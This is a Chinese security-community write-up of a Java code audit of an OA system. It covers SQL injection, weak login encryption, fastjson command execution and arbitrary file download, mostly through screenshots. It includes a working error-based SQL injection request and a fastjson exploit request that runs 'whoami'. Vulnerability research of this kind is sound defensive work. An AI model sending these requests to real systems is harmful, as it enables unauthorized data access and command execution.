# JAVA代码审计之某OA-先知社区

> **来源**: https://xz.aliyun.com/news/16814  
> **文章ID**: 16814

---

## 漏洞1：低版本SQL注入

漏洞点：`src/main/java/com/cloudweb/oa/controller/ApplicationController.java`

![image.png](images/20250218173348-748d529d-eddb-1.png)

查看下下面的if(isValid)

![image.png](images/20250218173403-7d7c27c9-eddb-1.png)

从配置里边获取版本

![image.png](images/20250218173412-83251269-eddb-1.png)

![image.png](images/20250218173419-8755cde9-eddb-1.png)

接着长时间进行判断版本。

![image.png](images/20250218173425-8a9ca4f1-eddb-1.png)

漏洞验证：

```
POST /oa/setup/checkPool?database=test'and+(extractvalue(1,concat(0x7e,(select+user()),0x7e)))--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2
```

![image.png](images/20250218173431-8e2f5f15-eddb-1.png)

## 漏洞2：登录框处-弱加密

core/src/main/java/com/cloudweb/oa/security/LoginAuthenticationProvider.java

查看代码，发现未对加密数据进行处理。

![image.png](images/20250218173436-912d317d-eddb-1.png)

漏洞复现：

![image.png](images/20250218173442-94b90e4d-eddb-1.png)

## 漏洞3：sql注入第一处

全局搜索${

![image.png](images/20250218173448-984cf8ae-eddb-1.png)

发现有多处应用该字符，然后随机找一处进行查看。

![image.png](images/20250218173454-9c2c8554-eddb-1.png)

定位到关键路径。

![image.png](images/20250218173455-9cb14f6d-eddb-1.png)

发现 在AddressService.java类导⼊了mapper

![image.png](images/20250218173456-9d5f73f9-eddb-1.png)

跟进代码进行查看。

![image.png](images/20250218173457-9e1ade02-eddb-1.png)

读完代码后，找到这段代码，有读注和⼀个声明公开的函数。

![image.png](images/20250218173459-9ed32ecf-eddb-1.png)

![image.png](images/20250218173500-9f89218a-eddb-1.png)

跟踪函数到AddressController.java

![image.png](images/20250218173503-a19250ae-eddb-1.png)![image.png](images/20250218173508-a4625378-eddb-1.png)

在AddressController.java中，发现这两个语句是在list()函数⾥边的。

![image.png](images/20250218173509-a51a5886-eddb-1.png)![image.png](images/20250218173510-a5b7fb91-eddb-1.png)

漏洞复现：

![image.png](images/20250218173511-a6624cf2-eddb-1.png)

## 漏洞4：sql注入第二处

继续查找”${“ 关键字

![image.png](images/20250218173512-a722381f-eddb-1.png)

继续找其他xml文件中的关键字。

![image.png](images/20250218173513-a7adb119-eddb-1.png)

查看代码并对其进行分析。![image.png](images/20250218173514-a81d3ad1-eddb-1.png)

找到引⽤mapper的对应类。![image.png](images/20250218173515-a8bac311-eddb-1.png)

在list函数中找到构建sql参数的函数，寻找可控变量。

![image.png](images/20250218173516-a95674a1-eddb-1.png)![image.png](images/20250218173517-a9e620cc-eddb-1.png)

查看⼀下是哪个地⽅引⽤了list函数。

![image.png](images/20250218173518-aa77317b-eddb-1.png)

发现在执行过程中未对其进行过滤。![image.png](images/20250218173519-ab056473-eddb-1.png)

漏洞复现：

![image.png](images/20250218173520-ab84ca2c-eddb-1.png)

## 漏洞5：fastjson漏洞

定位到：src/main/java/com/cloudweb/oa/controller/ApplicationController.java

![image.png](images/20250218173521-ac3057d1-eddb-1.png)

发现存在fastjson未授权命令执行漏洞。

![image.png](images/20250218173524-ae1177ca-eddb-1.png)

漏洞复现：

```
POST /oa/setup/updateUiSetup?applicationCode=1&uiSetup=payloadHTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Priority: u=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Content-Length: 18
cmd:whoami
```

## 漏洞6：任意文件下载

发现下载接口未对其进行过滤

![image.png](images/20250218173526-af0210f8-eddb-1.png)

可直接进行绕过下载。

![image.png](images/20250218173527-af8c6418-eddb-1.png)

​
